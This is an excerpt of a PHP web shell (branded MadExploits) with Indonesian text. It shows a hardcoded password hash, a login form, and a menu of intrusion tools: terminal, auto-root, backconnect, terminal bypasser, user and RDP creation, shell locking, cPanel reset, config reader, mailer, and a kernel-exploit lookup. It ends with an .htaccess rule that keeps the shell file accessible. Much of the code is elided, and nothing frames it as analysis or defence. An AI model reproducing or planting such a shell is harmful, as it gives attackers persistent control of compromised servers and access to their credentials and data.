...
$password = "1ea6025940543cc3cb622b1b25cc0a07";
...
?>
    ...
    <body>
        ...
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="Passwordnya mass">&nbsp;<input type="submit" name="submit" value=">">
            </div>
        </form>
    </body>
...
<head>
    ...
    <style>
        ...
        .shadow {
            -webkit-box-shadow:0px 0px 28px 0px rgba(204,0,255,0.9);
            -moz-box-shadow: 0px 0px 28px 0px rgba(204,0,255,0.9);
            box-shadow: 0px 0px 28px 0px rgba(204,0,255,0.9);
        }
    </style>
</head>
...
<body>
    ...
    <div class="menu-tools">
        <ul>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit">Terminal</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root">AUTO ROOT</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit">Adminer</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit">Backdoor Destroyer</a></li>
            <li class="shadow"><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit">Linux Exploit</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit">Lock Shell</a></li>
            <li class="shadow"><a href="" class="btn-submit badge-linux" id="lock-file">Lock File</a></li>
            <li class="shadow"><a href="" class="btn-submit badge-root" id="root-user">Create User</a></li>
            <li class="shadow"><a href="" class="btn-submit" id="create-rdp">CREATE RDP</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit">PHP Mailer</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit">BACKCONNECT</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=bypasser" class="btn-submit">TERMINAL BYPASSER</a></li>
            <li class="shadow"><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit">HASH IDENTIFIER</a></li>
            <li class="shadow"><a href="" class="btn-submit badge-windows" id="lock-windows">Lock File</a></li>
            <li class="shadow"><a href="" class="btn-submit">RCE OVW</a></li>
            <li class="shadow"><a href="" class="btn-submit">UPLD OVW</a></li>
            <li class="shadow"><a href="" class="btn-submit">JUMPPER</a></li>
            <li class="shadow"><a href="" class="btn-submit">CGIPRO</a></li>
            <li class="shadow"><a href="" class="btn-submit">DOMAIN LOOKUP</a></li>
            <li class="shadow"><a href="" class="btn-submit">WHOIS</a></li>
            <li class="shadow"><a href="" class="btn-submit">CPANEL RESET</a></li>
            <li class="shadow"><a href="" class="btn-submit">CONFIG READER!</a></li>
            <li class="shadow"><a href="" class="btn-submit">COMPRESSOR</a></li>
            <li class="shadow"><a href="//github.com/MadExploits/" class="btn-submit">README</a></li>
            <li class="shadow"><a href="?d=<?= hx($fungsi[0]()) ?>&logout=True" class="btn-submit">LOGOUT!</a></li>
        </ul>
    </div>
...
<FilesMatch "^(' . $CurrentFile . '|index.php|login.php)$">
    Allow from all
</FilesMatch>
